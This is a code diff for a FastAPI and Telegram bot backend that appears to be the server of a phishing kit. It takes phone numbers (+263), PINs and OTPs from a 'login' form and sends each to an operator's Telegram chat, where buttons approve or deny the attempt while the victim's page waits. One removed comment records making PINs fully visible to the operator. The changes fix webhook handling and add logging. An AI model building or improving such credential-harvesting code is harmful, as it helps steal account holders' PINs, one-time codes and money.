@@ -16,7 +16,6 @@ WEBHOOK_SECRET = os.environ.get("WEBHOOK_SECRET", "my-secret-token")
 if not BOT_TOKEN or not ADMIN_CHAT_ID:
     raise ValueError("BOT_TOKEN and ADMIN_CHAT_ID environment variables are required")
 
-# In-memory database
 transactions: Dict[str, Dict[str, Any]] = {}
 
 # --- PYDANTIC MODELS ---
@@ -36,22 +35,26 @@ class OTPRequest(BaseModel):
     price: str
 
 # --- TELEGRAM BOT SETUP ---
-ptb_app = Application.builder().token(BOT_TOKEN).build()
+# CRITICAL FIX: .updater(None) is required for Webhooks. 
+# If you don't add this, the bot tries to poll and ignores webhooks!
+ptb_app = Application.builder().token(BOT_TOKEN).updater(None).build()
 
 async def handle_telegram_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handles the Accept/Deny button clicks safely"""
     query = update.callback_query
     
     try:
-        # 1. Immediately stop the loading spinner on the button
-        await query.answer() 
+        # 1. Immediately stop the loading spinner on Telegram
+        await query.answer(text="Processing...") 
 
         # 2. Parse the callback data
         data = query.data.split(":")
         action = data[0]
         tx_id = data[1]
 
-        # 3. Check if the transaction exists (Render might have restarted and cleared memory)
+        print(f"🔘 Button Clicked: {action} for transaction {tx_id}")
+
+        # 3. Check if the transaction exists
         if tx_id in transactions:
             if action == "accept":
                 transactions[tx_id]["status"] = "approved"
@@ -61,7 +64,7 @@ async def handle_telegram_buttons(update: Update, context: ContextTypes.DEFAULT_
                         parse_mode="HTML"
                     )
                 except Exception:
-                    pass # Ignore if the message was already edited
+                    pass 
             elif action == "deny":
                 transactions[tx_id]["status"] = "denied"
                 try:
@@ -70,9 +73,9 @@ async def handle_telegram_buttons(update: Update, context: ContextTypes.DEFAULT_
                         parse_mode="HTML"
                     )
                 except Exception:
-                    pass # Ignore if the message was already edited
+                    pass 
         else:
-            # If the transaction is missing (Render went to sleep)
+            # If Render went to sleep and wiped memory
             try:
                 await query.edit_message_text(
                     text=f"{query.message.text}\n\n⚠️ <b>EXPIRED</b> (Server restarted)",
@@ -82,22 +85,22 @@ async def handle_telegram_buttons(update: Update, context: ContextTypes.DEFAULT_
                 pass
 
     except Exception as e:
-        print(f"Button Handler Error: {e}")
+        print(f"❌ Button Handler Error: {e}")
 
 ptb_app.add_handler(CallbackQueryHandler(handle_telegram_buttons))
 
 # --- FASTAPI LIFESPAN ---
 @asynccontextmanager
 async def lifespan(app: FastAPI):
+    print("Starting Telegram Bot...")
     await ptb_app.initialize()
-    await ptb_app.start()
+    # We do NOT call ptb_app.start() here because we don't need the updater
     yield
-    await ptb_app.stop()
+    print("Shutting down Telegram Bot...")
     await ptb_app.shutdown()
 
 app = FastAPI(lifespan=lifespan)
 
-# CORS Configuration
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"], 
@@ -117,7 +120,6 @@ async def initiate_login(req: LoginRequest):
         "data": req.model_dump()
     }
 
-    # FIXED: PIN is now fully visible (removed <tg-spoiler>)
     message = (
         f"🔐 <b>NEW LOGIN ATTEMPT</b>\n\n"
         f"📱 <b>Phone:</b> +263 {req.phone}\n"
@@ -188,7 +190,6 @@ async def verify_otp(req: OTPRequest):
 @app.get("/api/status/{tx_id}")
 async def get_status(tx_id: str):
     if tx_id not in transactions:
-        # If Render restarted, we return "denied" so the frontend doesn't get stuck
         return {"status": "denied"} 
     
     return {"status": transactions[tx_id]["status"]}
@@ -202,8 +203,11 @@ async def telegram_webhook(request: Request, x_telegram_bot_api_secret_token: Op
         raise HTTPException(status_code=403, detail="Invalid secret token")
 
     update_data = await request.json()
+    print(f"📥 Received Webhook: {update_data.get('update_id')}")
+    
     update = Update.de_json(update_data, ptb_app.bot)
     await ptb_app.process_update(update)
+    
     return {"status": "ok"}
 
 @app.get("/api/webhook/set")
